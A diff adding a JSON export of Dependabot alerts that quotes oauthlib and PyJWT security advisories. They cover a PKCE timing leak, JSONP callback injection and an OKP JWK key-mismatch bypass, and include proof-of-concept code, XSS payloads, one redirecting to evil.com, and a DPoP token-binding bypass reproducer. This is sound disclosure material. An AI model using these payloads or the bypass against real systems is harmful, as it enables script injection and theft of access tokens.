@@ -1,0 +1,896 @@
+{
+  "open": [
+    {
+      "number": 31,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "oauthlib"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-xpv3-w29h-x7cv",
+        "cve_id": "CVE-2026-49265",
+        "summary": "Oauthlib: Timing Attack Vulnerability in PKCE code_verifier Comparison (CWE-208)",
+        "description": "## Summary\n\nA timing side-channel vulnerability exists in the PKCE (RFC 7636) implementation \nof the Authorization Code Grant flow. The `code_challenge_method_plain` function \nuses Python's standard `==` operator for string comparison instead of a \nconstant-time comparison function, potentially allowing timing-based attacks.\n\n## Affected Component\n\n- File: `oauthlib/oauth2/rfc6749/grant_types/authorization_code.py`\n- Functions: `code_challenge_method_plain`, `code_challenge_method_s256`\n- Vulnerability Type: CWE-208 (Observable Timing Discrepancy)\n\n## Technical Details\n\nPython's `==` operator uses short-circuit evaluation when comparing strings:\n1. Returns `False` immediately if lengths differ\n2. Compares characters left-to-right, stopping at first mismatch\n\nThis means comparison time varies linearly with the length of the common prefix \nbetween the attacker-supplied verifier and the stored challenge, creating a \nmeasurable timing oracle.\n\n## Proof of Concept\n\nTested locally against oauthlib source (network jitter eliminated to isolate \npure Python execution time):\n\n| Input | Result | Time (10M iterations) |\n|---|---|---|\n| Wrong first char (`B` + `A`*49) | Fast reject | 0.34106s |\n| 49 chars correct (`A`*49 + `B`) | Deep compare | 0.37847s |\n| **Difference** | | **0.03741s** |\n\nThe ~37ms delta over 10M iterations corresponds to nanosecond-level differences \nper call, which are statistically exploitable under controlled conditions.\n\n## Attack Scenario\n\n1. Attacker intercepts `authorization_code` via Custom URI Scheme Hijacking\n2. PKCE blocks token request \u2014 attacker lacks `code_verifier`\n3. Attacker sends repeated requests to `/token` endpoint measuring response times\n4. Using timing oracle, attacker recovers `code_verifier` character by character\n5. Attacker obtains Access Token \u2192 Account Takeover\n\n> **Note:** Practical exploitability is limited due to the single-use nature of \n> authorization codes and real-world network noise. However, the vulnerable \n> pattern should be corrected as a defense-in-depth measure.\n\n## Recommended Fix\n\nReplace `==` with `hmac.compare_digest()` for constant-time comparison:\n\ncr: Elvin Latifli",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-xpv3-w29h-x7cv",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-49265",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-xpv3-w29h-x7cv"
+          },
+          {
+            "url": "https://github.com/oauthlib/oauthlib/pull/963"
+          },
+          {
+            "url": "https://github.com/oauthlib/oauthlib/commit/40b0ab56da3682c2484a4b78bbff309f8025d950"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49265"
+          },
+          {
+            "url": "https://github.com/pypa/advisory-database/tree/main/vulns/oauthlib/PYSEC-2026-4114.yaml"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-xpv3-w29h-x7cv"
+          }
+        ],
+        "published_at": "2026-09-29T17:56:31Z",
+        "updated_at": "2026-10-13T15:47:41Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "oauthlib"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 3.0.0, < 4.0.0",
+            "first_patched_version": {
+              "identifier": "4.0.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+            "score": 6.8
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+          "score": 6.8
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-208",
+            "name": "Observable Timing Discrepancy"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "oauthlib"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 3.0.0, < 4.0.0",
+        "first_patched_version": {
+          "identifier": "4.0.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/31",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/31",
+      "created_at": "2026-09-29T18:38:35Z",
+      "updated_at": "2026-09-29T18:38:35Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    },
+    {
+      "number": 30,
+      "state": "open",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "oauthlib"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-hj66-6f7g-4r5v",
+        "cve_id": "CVE-2026-49264",
+        "summary": "Oauthlib : Unsafe JSONP callback injection in RevocationEndpoint allows arbitrary JavaScript response generation",
+        "description": "### Summary\n\nWhen `enable_jsonp=True`, oauthlib's `RevocationEndpoint` reflects the user-supplied `callback` parameter directly into JavaScript response bodies on both success and error paths without validating that it is a legal JSONP callback name. This allows arbitrary JavaScript response generation instead of a restricted function call, making the documented JSONP revocation feature unsafe for browser-based JSONP consumption when attackers can influence `callback`.\n\n### Details\n\nThe issue is in `oauthlib/oauth2/rfc6749/endpoints/revocation.py`.\n\nWhen `enable_jsonp=True` is passed to the `RevocationEndpoint` constructor, two code paths wrap the response body using the user-supplied `request.callback` parameter:\n\n```python\n# Error response path (line 72-73):\nif self.enable_jsonp and request.callback:\n    response_body = '{}({});'.format(request.callback, response_body)\n\n# Success response path (line 81-82):\nif self.enable_jsonp and request.callback:\n    response_body = request.callback + '();'\n```\n\nThe `request.callback` value comes from HTTP request parameters, either the query string or POST body, via the `Request` class in `oauthlib/common.py` (lines 394-395), which merges query and body parameters into `_params`. Any value the client sends as `callback` is used verbatim.\n\nThere is no validation of any kind on the callback parameter:\n- No check that it is a valid JavaScript identifier\n- No whitelist of allowed characters\n- No escaping or sanitization\n\nA safe JSONP implementation must validate that the callback is a legal JavaScript function name (e.g., matching `^[a-zA-Z_$][a-zA-Z0-9_$.]*$`). Without this, the attacker controls the JavaScript code returned in the response body. This is the standard mitigation used by jQuery, Express.js, Google APIs, and other major JSONP implementations.\n\n**How the injection works:**\n\nAn attacker sends a revocation request with a crafted callback value:\n\n```\nPOST /revoke HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ntoken=anything&callback=alert(document.cookie)//\n```\n\nThe server responds with:\n\n```\nalert(document.cookie)//({\"error\": \"invalid_client\"});\n```\n\nThis is syntactically valid JavaScript. `alert(document.cookie)` executes as a statement, and `//` comments out the rest of the line. The attacker has full control over the code that appears before the `//`.\n\n**Execution context and attack surface:**\n\nJSONP works by having a browser load a remote script via `<script src=\"...\">`. The loaded script executes in the origin of the **including page**, not the remote server. This means a `<script src=\"https://auth.example.com/revoke?token=x&callback=payload\">` tag on `evil.com` would execute the payload in `evil.com`'s context, not the auth server's context.\n\nThe impact comes from client-side integrations that consume this endpoint as trusted JSONP. If a legitimate OAuth client includes `<script src>` pointed at the revocation endpoint and an attacker can influence the callback value (e.g., via query parameter injection, a reflected value, or a man-in-the-middle downgrade), the attacker controls what code runs in the client application's origin. The authorization server becomes a source of attacker-controlled JavaScript that client applications trust and execute.\n\nNote: the `enable_jsonp` parameter defaults to `False`, so only deployments that explicitly opt in are affected. However, this is a supported, documented library feature, not a debug flag. The client-side library includes `prepare_token_revocation_request()` with an explicit `callback` parameter (`oauthlib/oauth2/rfc6749/parameters.py`, line 174), and the documentation shows JSONP revocation as a use case (`oauthlib/oauth2/rfc6749/clients/base.py`, lines 351-358). The existing test suite tests JSONP callback reflection with a benign value (`test_revocation_endpoint.py`, lines 91-101) but does not test for injection. Deployments that enable JSONP typically do so to support older browsers or cross-origin revocation from JavaScript clients, these are exactly the environments most sensitive to script injection.\n\n### PoC\n\n**Requirements:** Python 3.x with oauthlib installed (`pip install oauthlib`).\n\n```python\nfrom oauthlib.oauth2.rfc6749.endpoints.revocation import RevocationEndpoint\nfrom oauthlib.oauth2.rfc6749.request_validator import RequestValidator\n\n\nclass FailValidator(RequestValidator):\n    \"\"\"Auth fails -> triggers error response path (lines 72-73).\"\"\"\n    def client_authentication_required(self, request, *a, **kw): return True\n    def authenticate_client(self, request, *a, **kw): return False\n    def authenticate_client_id(self, client_id, request, *a, **kw): return False\n\n\nclass PassValidator(RequestValidator):\n    \"\"\"Auth passes -> triggers success response path (lines 81-82).\"\"\"\n    def client_authentication_required(self, request, *a, **kw): return False\n    def authenticate_client_id(self, client_id, request, *a, **kw): return True\n    def revoke_token(self, token, token_type_hint, request, *a, **kw): pass\n\n\npayloads = [\n    \"alert(document.cookie)//\",\n    \"window.location='https://evil.com/'//\",\n    \"eval('malicious')//\",\n]\n\n# --- Error path (401) ---\nprint(\"Error path (enable_jsonp=True, auth fails):\")\nep_fail = RevocationEndpoint(FailValidator(), enable_jsonp=True)\nfor p in payloads:\n    h, body, status = ep_fail.create_revocation_response(\n        \"https://auth.example.com/revoke\", http_method=\"POST\",\n        body=f\"token=x&callback={p}\")\n    assert p in body, \"Payload not reflected\"\n    print(f\"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}\")\n\n# --- Success path (200) ---\nprint(\"\\nSuccess path (enable_jsonp=True, revocation succeeds):\")\nep_pass = RevocationEndpoint(PassValidator(), enable_jsonp=True)\nfor p in payloads:\n    h, body, status = ep_pass.create_revocation_response(\n        \"https://auth.example.com/revoke\", http_method=\"POST\",\n        body=f\"token=x&callback={p}\")\n    assert p in body, \"Payload not reflected\"\n    print(f\"  [{status}] Content-Type: {h.get('Content-Type','(none)')}  Body: {body}\")\n\n# --- Control (default: enable_jsonp=False) ---\nprint(\"\\nControl (enable_jsonp=False, default):\")\nep_safe = RevocationEndpoint(FailValidator(), enable_jsonp=False)\n_, body, status = ep_safe.create_revocation_response(\n    \"https://auth.example.com/revoke\", http_method=\"POST\",\n    body=\"token=x&callback=alert(1)//\")\nassert \"alert\" not in body, \"Payload should not be present\"\nprint(f\"  [{status}] {body}\")\nprint(\"\\nAll assertions passed.\")\n```\n\n**Expected output:**\n\n```\nError path (enable_jsonp=True, auth fails):\n  [401] Content-Type: application/json  Body: alert(document.cookie)//({\"error\": \"invalid_client\"});\n  [401] Content-Type: application/json  Body: window.location='https://evil.com/'//({\"error\": \"invalid_client\"});\n  [401] Content-Type: application/json  Body: eval('malicious')//({\"error\": \"invalid_client\"});\n\nSuccess path (enable_jsonp=True, revocation succeeds):\n  [200] Content-Type: (none)  Body: alert(document.cookie)//();\n  [200] Content-Type: (none)  Body: window.location='https://evil.com/'//();\n  [200] Content-Type: (none)  Body: eval('malicious')//();\n\nControl (enable_jsonp=False, default):\n  [401] {\"error\": \"invalid_client\"}\n\nAll assertions passed.\n```\n\nBoth paths reflect the attacker's payload verbatim into the response body.\n\n### Impact\n\nAny oauthlib-based authorization server that enables JSONP on the revocation endpoint (`enable_jsonp=True`) returns attacker-controlled JavaScript in its response body.\n\nAny page or application that loads this endpoint's response as JSONP and exposes attacker influence over the `callback` parameter will execute attacker-controlled code in its own origin. If a legitimate OAuth client uses JSONP revocation (as documented by oauthlib's client-side API) and an attacker can influence the callback value, the attacker controls what code runs in the client application, including access to the client page's DOM and any data normally accessible to scripts running in that origin.\n\nThe JSONP feature is intended for legacy cross-origin browser support. Deployments that need it are typically JavaScript-heavy clients, exactly the environment most sensitive to script injection.\n\n**Affected versions:** oauthlib >= 0.6.1 through 3.3.1 (current) and master. The unsanitized callback has been present since the revocation endpoint was first introduced in 2013 (commit `da775de`). The `enable_jsonp` gate was added in 2014 (commit `b85f89a`) but no validation of the callback value was ever added.\n\n### Suggested fix\n\nValidate the `callback` parameter against a strict pattern for legal JavaScript identifiers before using it in the response. Reject or ignore values that do not match:\n\n```python\nimport re\n\n# Only allow safe JSONP callback names: valid JS identifiers, optionally dot-separated\nJSONP_CALLBACK_PATTERN = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*(\\.[a-zA-Z_$][a-zA-Z0-9_$]*)*$')\n\n# In create_revocation_response(), before using request.callback:\nif self.enable_jsonp and request.callback:\n    if not JSONP_CALLBACK_PATTERN.match(request.callback):\n        request.callback = None\n```\n\nThis is the standard mitigation for JSONP callback injection and is the approach used by jQuery, Express.js, and Google APIs. It ensures only syntactically valid function names like `package.hello_world` are accepted, while blocking payloads like `alert(document.cookie)//`.\n\nAs a secondary hardening measure, when JSONP is enabled, the response should set `Content-Type: application/javascript` (not `application/json` or empty) to ensure correct browser handling. Currently the success path returns no Content-Type at all, and the error path returns `application/json`.\n\nAlternatively, if JSONP is no longer considered a necessary feature, consider deprecating and removing the `enable_jsonp` option entirely. CORS is now supported by all modern browsers and is the standard mechanism for cross-origin API access.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-hj66-6f7g-4r5v",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-49264",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/oauthlib/oauthlib/security/advisories/GHSA-hj66-6f7g-4r5v"
+          },
+          {
+            "url": "https://github.com/oauthlib/oauthlib/pull/951"
+          },
+          {
+            "url": "https://github.com/oauthlib/oauthlib/commit/c888359f3c42bec235b2c5caab2069c9ed62457c"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-49264"
+          },
+          {
+            "url": "https://github.com/pypa/advisory-database/tree/main/vulns/oauthlib/PYSEC-2026-4113.yaml"
+          },
+          {
+            "url": "https://github.com/advisories/GHSA-hj66-6f7g-4r5v"
+          }
+        ],
+        "published_at": "2026-09-29T17:53:41Z",
+        "updated_at": "2026-10-13T15:49:09Z",
+        "withdrawn_at": null,
+        "vulnerabilities": [
+          {
+            "package": {
+              "ecosystem": "pip",
+              "name": "oauthlib"
+            },
+            "severity": "medium",
+            "vulnerable_version_range": ">= 0.6.1, <= 3.3.1",
+            "first_patched_version": {
+              "identifier": "4.0.0"
+            }
+          }
+        ],
+        "cvss_severities": {
+          "cvss_v3": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+            "score": 6.1
+          },
+          "cvss_v4": {
+            "vector_string": null,
+            "score": 0.0
+          }
+        },
+        "cvss": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "score": 6.1
+        },
+        "cwes": [
+          {
+            "cwe_id": "CWE-79",
+            "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          }
+        ],
+        "classification": "general"
+      },
+      "security_vulnerability": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "oauthlib"
+        },
+        "severity": "medium",
+        "vulnerable_version_range": ">= 0.6.1, <= 3.3.1",
+        "first_patched_version": {
+          "identifier": "4.0.0"
+        }
+      },
+      "url": "https://api.github.com/repos/unified-systems-com/tap/dependabot/alerts/30",
+      "html_url": "https://github.com/unified-systems-com/tap/security/dependabot/30",
+      "created_at": "2026-09-29T18:38:34Z",
+      "updated_at": "2026-09-29T18:38:34Z",
+      "dismissal_request": null,
+      "assignees": [],
+      "dismissed_at": null,
+      "dismissed_by": null,
+      "dismissed_reason": null,
+      "dismissed_comment": null,
+      "fixed_at": null,
+      "auto_dismissed_at": null
+    }
+  ],
+  "fixed": [
+    {
+      "number": 48,
+      "state": "fixed",
+      "dependency": {
+        "package": {
+          "ecosystem": "pip",
+          "name": "PyJWT"
+        },
+        "manifest_path": "uv.lock",
+        "scope": "runtime",
+        "relationship": "transitive"
+      },
+      "security_advisory": {
+        "ghsa_id": "GHSA-x33g-cr3x-6449",
+        "cve_id": "CVE-2026-102275",
+        "summary": "PyJWT accepts inconsistent OKP x/d JWKs, causing public/private key identity confusion",
+        "description": "### Summary\n\nPyJWT accepts internally inconsistent OKP private JWKs where the declared public key `x` does not correspond to the supplied private key `d`.\n\nWhen `d` is present, `OKPAlgorithm.from_jwk()` constructs the Ed25519/Ed448 private key from `d` without verifying that the public key derived from `d` matches `x`. As a result, the original JWK can contain one public key identity while PyJWT performs cryptographic operations using a different key.\n\nIn affected DPoP integrations, this can allow a stolen sender-constrained access token to be used without possession of the legitimate holder's private key.\n\n### Details\n\nThe vulnerable logic is in `jwt/algorithms.py`:\n\n```python\nif \"x\" not in obj:\n    raise InvalidKeyError('OKP should have \"x\" parameter')\n\nx = base64url_decode(obj.get(\"x\"))\n\nif \"d\" not in obj:\n    if curve == \"Ed25519\":\n        return Ed25519PublicKey.from_public_bytes(x)\n    return Ed448PublicKey.from_public_bytes(x)\n\nd = base64url_decode(obj.get(\"d\"))\n\nif curve == \"Ed25519\":\n    return Ed25519PrivateKey.from_private_bytes(d)\n\nreturn Ed448PrivateKey.from_private_bytes(d)\n```\n\nWhen `d` is present, `x` is parsed but never compared with the public key derived from `d`.\n\nFor example, PyJWT accepts:\n\n```json\n{\n  \"kty\": \"OKP\",\n  \"crv\": \"Ed25519\",\n  \"x\": \"<legitimate-user-public-key>\",\n  \"d\": \"<attacker-private-key>\"\n}\n```\n\neven though `x` and `d` belong to different key pairs.\n\nThe behavior has existed since OKP private-JWK import was introduced:\n\n* Ed25519: PyJWT 2.1.0+\n* Ed448: PyJWT 2.2.0+\n* Confirmed through PyJWT 2.14.0 and current master\n\nA correct import should derive the public key from `d` and reject the JWK when it does not equal the supplied `x`.\n\n### PoC\n\nThe reproducer creates two Ed25519 keypairs:\n\n* a legitimate holder keypair\n* an attacker keypair\n\nIt then:\n\n1. Creates an access token whose `cnf.jkt` is bound to the legitimate public key.\n2. Creates a DPoP proof JWK containing the legitimate user's `x` together with the attacker's `d`.\n3. Computes the RFC 7638 thumbprint from `x`, which still matches the access-token binding.\n4. Passes the complete JWK to `PyJWK.from_dict()`.\n5. PyJWT imports the private key from the attacker-controlled `d`.\n6. A DPoP proof signed with the attacker's private key verifies successfully.\n\nObserved result:\n\n```text\nthumbprint_matches: true\nactual_key_is_attacker_key: true\nactual_key_matches_declared_x: false\nstolen_sender_constrained_token_accepted: true\nattacker_has_legitimate_private_key: false\n```\n\nTested on PyJWT 2.13.0, PyJWT 2.14.0, and current master.\n\nThe complete reproducer is:\n```python\n#!/usr/bin/env python3\n\n\nfrom __future__ import annotations\n\nimport base64\nimport hashlib\nimport json\nimport os\nimport platform\nimport time\nfrom importlib.metadata import version\nfrom typing import Any\n\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey\nfrom cryptography.hazmat.primitives.serialization import (\n    Encoding,\n    NoEncryption,\n    PrivateFormat,\n    PublicFormat,\n)\n\n\nACCESS_TOKEN_SECRET = b\"synthetic-authorization-server-key-32b\"\nHTTP_METHOD = \"GET\"\nHTTP_URI = \"https://resource.example/protected\"\n\n\ndef b64url(raw: bytes) -> str:\n    return base64.urlsafe_b64encode(raw).rstrip(b\"=\").decode(\"ascii\")\n\n\ndef public_x(private_key: Ed25519PrivateKey) -> str:\n    return b64url(private_key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw))\n\n\ndef private_d(private_key: Ed25519PrivateKey) -> str:\n    return b64url(\n        private_key.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption())\n    )\n\n\ndef jwk_thumbprint(jwk: dict[str, Any]) -> str:\n    canonical = json.dumps(\n        {\"crv\": jwk[\"crv\"], \"kty\": jwk[\"kty\"], \"x\": jwk[\"x\"]},\n        separators=(\",\", \":\"),\n        sort_keys=True,\n    ).encode(\"ascii\")\n    return b64url(hashlib.sha256(canonical).digest())\n\n\ndef access_token_hash(access_token: str) -> str:\n    return b64url(hashlib.sha256(access_token.encode(\"ascii\")).digest())\n\n\ndef verify_resource_request(\n    access_token: str,\n    proof: str,\n    *,\n    reject_private_header_jwk: bool = False,\n) -> dict[str, Any]:\n    \"\"\"Model the security-relevant stages of an RFC 9449 resource server.\"\"\"\n    access_claims = jwt.decode(\n        access_token,\n        ACCESS_TOKEN_SECRET,\n        algorithms=[\"HS256\"],\n        issuer=\"https://authorization.example\",\n        audience=\"resource-api\",\n        options={\"require\": [\"exp\", \"iss\", \"aud\", \"sub\", \"cnf\"]},\n    )\n    header = jwt.get_unverified_header(proof)\n    if header.get(\"typ\") != \"dpop+jwt\" or header.get(\"alg\") != \"EdDSA\":\n        raise ValueError(\"invalid DPoP header policy\")\n    jwk = header.get(\"jwk\")\n    if not isinstance(jwk, dict):\n        raise ValueError(\"missing DPoP JWK\")\n    if reject_private_header_jwk and any(\n        member in jwk for member in (\"d\", \"p\", \"q\", \"dp\", \"dq\", \"qi\", \"k\")\n    ):\n        raise ValueError(\"DPoP header JWK contains private material\")\n    if jwk_thumbprint(jwk) != access_claims[\"cnf\"][\"jkt\"]:\n        raise ValueError(\"DPoP key does not match cnf.jkt\")\n\n    key = jwt.PyJWK.from_dict(jwk)\n    proof_claims = jwt.decode(\n        proof,\n        key,\n        algorithms=[\"EdDSA\"],\n        options={\"require\": [\"htm\", \"htu\", \"iat\", \"jti\", \"ath\"]},\n    )\n    if proof_claims[\"htm\"] != HTTP_METHOD or proof_claims[\"htu\"] != HTTP_URI:\n        raise ValueError(\"DPoP request binding mismatch\")\n    if proof_claims[\"ath\"] != access_token_hash(access_token):\n        raise ValueError(\"DPoP access-token hash mismatch\")\n    return access_claims\n\n\ndef main() -> None:\n    legitimate_holder = Ed25519PrivateKey.generate()\n    attacker = Ed25519PrivateKey.generate()\n    legitimate_x = public_x(legitimate_holder)\n    attacker_x = public_x(attacker)\n\n    legitimate_public_jwk = {\n        \"alg\": \"EdDSA\",\n        \"crv\": \"Ed25519\",\n        \"kty\": \"OKP\",\n        \"x\": legitimate_x,\n    }\n    mismatched_proof_jwk = {\n        **legitimate_public_jwk,\n        \"d\": private_d(attacker),\n    }\n    pinned_jkt = jwk_thumbprint(legitimate_public_jwk)\n\n    now = int(time.time())\n    access_token = jwt.encode(\n        {\n            \"aud\": \"resource-api\",\n            \"cnf\": {\"jkt\": pinned_jkt},\n            \"exp\": now + 300,\n            \"iat\": now,\n            \"iss\": \"https://authorization.example\",\n            \"scope\": \"admin:read\",\n            \"sub\": \"legitimate-holder\",\n        },\n        ACCESS_TOKEN_SECRET,\n        algorithm=\"HS256\",\n    )\n    proof_claims = {\n        \"ath\": access_token_hash(access_token),\n        \"htm\": HTTP_METHOD,\n        \"htu\": HTTP_URI,\n        \"iat\": now,\n        \"jti\": \"synthetic-attacker-proof\",\n    }\n    attacker_proof = jwt.encode(\n        proof_claims,\n        attacker,\n        algorithm=\"EdDSA\",\n        headers={\"jwk\": mismatched_proof_jwk, \"typ\": \"dpop+jwt\"},\n    )\n\n    imported = jwt.PyJWK.from_dict(mismatched_proof_jwk).key\n    imported_x = b64url(\n        imported.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)\n    )\n    accepted_claims = verify_resource_request(access_token, attacker_proof)\n\n    public_only_rejected = False\n    public_only_error = None\n    public_only_proof = jwt.encode(\n        proof_claims,\n        attacker,\n        algorithm=\"EdDSA\",\n        headers={\"jwk\": legitimate_public_jwk, \"typ\": \"dpop+jwt\"},\n    )\n    try:\n        verify_resource_request(access_token, public_only_proof)\n    except Exception as error:\n        public_only_rejected = True\n        public_only_error = type(error).__name__\n\n    private_member_control_rejected = False\n    private_member_control_error = None\n    try:\n        verify_resource_request(\n            access_token,\n            attacker_proof,\n            reject_private_header_jwk=True,\n        )\n    except Exception as error:\n        private_member_control_rejected = True\n        private_member_control_error = type(error).__name__\n\n    result = {\n        \"environment\": {\n            \"PyJWT\": jwt.__version__,\n            \"PyJWT_source\": str(jwt.__file__),\n            \"Python\": platform.python_version(),\n            \"cryptography\": version(\"cryptography\"),\n            \"source_ref\": os.environ.get(\"PYJWT_SOURCE_REF\", \"installed-release\"),\n        },\n        \"dpop_binding\": {\n            \"access_token_subject\": accepted_claims[\"sub\"],\n            \"access_token_scope\": accepted_claims[\"scope\"],\n            \"pinned_jkt\": pinned_jkt,\n            \"proof_jkt\": jwk_thumbprint(mismatched_proof_jwk),\n            \"thumbprint_matches\": jwk_thumbprint(mismatched_proof_jwk) == pinned_jkt,\n        },\n        \"imported_key\": {\n            \"declared_x\": legitimate_x,\n            \"attacker_x\": attacker_x,\n            \"actual_imported_x\": imported_x,\n            \"actual_key_is_attacker_key\": imported_x == attacker_x,\n            \"actual_key_matches_declared_x\": imported_x == legitimate_x,\n        },\n        \"vulnerable_composition\": {\n            \"stolen_sender_constrained_token_accepted\": accepted_claims[\"sub\"]\n            == \"legitimate-holder\",\n            \"attacker_has_legitimate_private_key\": False,\n        },\n        \"controls\": {\n            \"public_only_jwk_rejected\": public_only_rejected,\n            \"public_only_error\": public_only_error,\n            \"reject_private_header_jwk_blocks_attack\": private_member_control_rejected,\n            \"private_member_control_error\": private_member_control_error,\n        },\n    }\n\n    assert jwk_thumbprint(mismatched_proof_jwk) == pinned_jkt\n    assert imported_x == attacker_x\n    assert imported_x != legitimate_x\n    assert accepted_claims[\"sub\"] == \"legitimate-holder\"\n    assert public_only_rejected and public_only_error == \"InvalidSignatureError\"\n    assert private_member_control_rejected and private_member_control_error == \"ValueError\"\n    print(json.dumps(result, indent=2, sort_keys=True))\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n```text\n06-practical-testing/pyjwt-okp-dpop-binding-bypass-lab.py\n```\n\nA public example of the affected composition exists in StrongDM's `agentic-auth` Flask middleware: it computes an OKP thumbprint from `x` and subsequently passes the entire JWK to `PyJWK.from_dict()` for EdDSA DPoP verification without rejecting `d`.\n\n### Impact\n\nThe PyJWT-owned issue is acceptance of internally inconsistent cryptographic key material: the JWK can declare one public key while the operative private key corresponds to another.\n\nIn a DPoP verifier that:\n\n* calculates `cnf.jkt` / JWK thumbprints from the declared `x`,\n* passes the same JWK to PyJWT for signature verification, and\n* does not reject private JWK parameters,\n\nan attacker who steals a sender-constrained access token can use the token without possessing the legitimate holder's private key.\n\nRFC 9449 \u00a74.2 requires DPoP implementations to reject private key parameters in proof JWKs. Therefore the demonstrated authentication bypass additionally requires a DPoP implementation that omits this check. RFC-compliant DPoP implementations that reject `d` are not vulnerable to the demonstrated attack.\n\n### Maintainer assessment (2026-09-12)\n\nWe independently reproduced the PyJWT-owned issue: importing a private OKP JWK with non-corresponding `x` and `d` components returned the private key derived from `d` while accepting the conflicting declared public identity. The precise library impact is loss of JWK key-component consistency; a caller that uses `x` as the JWK identity and the returned key for cryptographic operations can act on two different key identities.\n\nExact boundary checks found Ed25519 JWK import absent in 2.0.1 and the inconsistent-pair behavior present in 2.1.0. Ed448 JWK import was absent in 2.1.0 and the behavior was present in 2.2.0. Both curves reproduced in 2.14.0 and the tested pre-fix source. These samples support the existing affected metadata (`>= 2.1.0, <= 2.14.0`) and the per-curve introduction points, but do not claim exhaustive testing of every intervening release.\n\nThe fix is on `master` in commit `3cd9ceec33ced359decbad75b413ad668ae6332c`. It derives the public bytes from `d`, compares them with `x`, and rejects a mismatch. Fresh independent Astra/max review accepted the exact tree `9f219601e39026c7094d48f3fbb6678951878aa8` with no blocking findings or required revisions. Targeted red/green and sibling-path checks passed, and the exact repository CI command `python -m tox` passed all 35 required environments both before and after the commit.\n\nThe reported DPoP stolen-token scenario additionally requires an application to pass a private JWK from the proof header without rejecting private-key parameters. RFC 9449 sections 4.2 and 4.3 require such parameters to be absent or rejected, so that bypass is application-dependent and outside PyJWT's security-policy scope; it is not used to characterize the PyJWT-owned impact.\n\nThe fix is not yet contained in a released PyJWT 2.x version, so `patched_versions` remains empty and this advisory remains unpublished. The next lifecycle step is to move the advisory from triage to draft now that the verified fix is on `master`; publication must wait until a new released 2.x version is confirmed to contain the fix and is recorded as the patched boundary.\n---\n\n### Maintainer release update (2026-09-23)\n\nPyJWT 2.15.0 is the first released version containing the OKP JWK consistency fix. Its GitHub release tag points to commit `1d41a6478e1562e68ff667fcd703356acf085f68`, which includes fix commit `3cd9ceec33ced359decbad75b413ad668ae6332c`. PyPI published both the wheel and source distribution from that release commit through the successful production workflow at https://github.com/jpadilla/pyjwt/actions/runs/35891602963.\n\nThe published PyPI wheel (`pyjwt-2.15.0-py3-none-any.whl`, SHA-256 `7a3742debf6b879e912dbb9819ceec1594be812452b78c5f2e2dfc56564954f8`) was checked directly: matching Ed25519 and Ed448 `x`/`d` private JWK components import successfully, while mismatched components raise `InvalidKeyError`. The supported affected range remains `>= 2.1.0, <= 2.14.0`; the patched version is `2.15.0`. The earlier statement that no released patched version exists is superseded by this update.\n\nThe PyJWT-owned impact is acceptance of internally inconsistent OKP key material in affected versions. The reported DPoP stolen-token scenario additionally requires an application to accept private key parameters from a proof header, contrary to RFC 9449; it is not the basis for this advisory's classification. CVSS v3.1 6.5 (Medium), CWE-345, and CWE-348 are unchanged.",
+        "severity": "medium",
+        "identifiers": [
+          {
+            "value": "GHSA-x33g-cr3x-6449",
+            "type": "GHSA"
+          },
+          {
+            "value": "CVE-2026-102275",
+            "type": "CVE"
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-x33g-cr3x-6449"
+          },
+          {
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102275"
+          },
+          {
+            "url": "https://github.com/jpadilla/pyjwt/commit/3cd9ceec33ced359decbad75b413ad668ae6332c"
